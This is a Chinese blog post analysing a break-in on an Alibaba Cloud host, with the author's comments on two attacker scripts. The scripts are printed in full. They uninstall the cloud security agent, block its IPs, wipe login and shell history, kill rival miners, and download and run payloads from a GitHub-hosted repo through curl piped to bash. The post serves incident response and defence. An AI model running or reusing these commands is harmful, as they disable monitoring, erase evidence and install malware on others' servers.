# 记上次黑客入侵阿里云主机 —— 代码分析（上）

已将问题反馈到阿里云安全团队客服，并向阿里云中心举报其地址。接下来是代码分析。(前面两部分)

## xz.sh部分，即卸载脚本

参考信息源：

* [bili_62374023667-linux下ETH转发服务器+ETH抽水教程，支持SSL加密+删除阿狸监控避免上报](https://www.bilibili.com/read/cv15054271/)
* [csdn-linux+agent卸载_华为云服务器卸载agent监控服务Linux+windows教程](https://blog.csdn.net/weixin_33148621/article/details/113900993)
* [CentOS服务器清除用户登录记录和命令历史方法](https://blog.csdn.net/cljdsc/article/details/123358983)
* [Linux基础：history命令](https://blog.51cto.com/skypegnu1/1941153)


黑客核心代码解读

```
# 首先是下载阿里云盾卸载脚本
wget http://update.aegis.aliyun.com/download/uninstall.sh
chmod +x uninstall.sh && ./uninstall.sh
# 然后屏蔽掉云盾IP
iptables -I INPUT -s 140.205.201.0/28 -j DROP
# 进行恶意卸载云盾等其他组件服务
sh /usr/local/qcloud/stargate/admin/uninstall.sh
# 还把监控都给停止了
service telescoped stop
# 清除系统登录成功命令历史记录
echo > /var/log/wtmp 
# 清除登陆系统失败的记录
echo > /var/log/btmp
# 导入空记录，清除历史执行命令
echo > .bash_history
# 清除历史执行命令并保存。
history -c && history -w
# 删掉脚本
rm -rf cd /root/uninstall.sh
```

## k.sh，即杀死进程脚本

参考信息源：

* [Shell 文件或目录操作符（-e、-d、-f、-r、-w、-x）](https://blog.csdn.net/zz00008888/article/details/122360612)

黑客核心代码解读

```
# 结束dos26（可能为ddos）
killall -9 dos26
# 结束不明程序（命名不知其意）
killall -9 tfq
# 结束挖矿程序
killall -9 xmrig
# 删除程序
rm -rf cd /tmp/dos26
rm -rf cd /tmp/tfq
rm -rf cd /tmp/xmrig
# 判断对象是否有可写(Write)权限，是则为真
if [ ! -w "/tmp/dos64" ]; then
# 进入目录，下载恶意dos，赋予读写及执行权限，并执行
    cd /tmp;wget https://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/dos64;chmod 777 dos64;./dos64
fi
if [ ! -w "/root/c3pool/xmrig" ]; then
# 下载恶意靶机脚本执行
    curl -s -L https://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/ba.sh | bash -s
fi
# 又一次删除程序
rm -rf cd /tmp/dos26
rm -rf cd /tmp/tfq
rm -rf cd /tmp/xmrig
# 休眠，删掉挖矿记录文件
sleep 88;rm -rf cd /root/c3pool
```



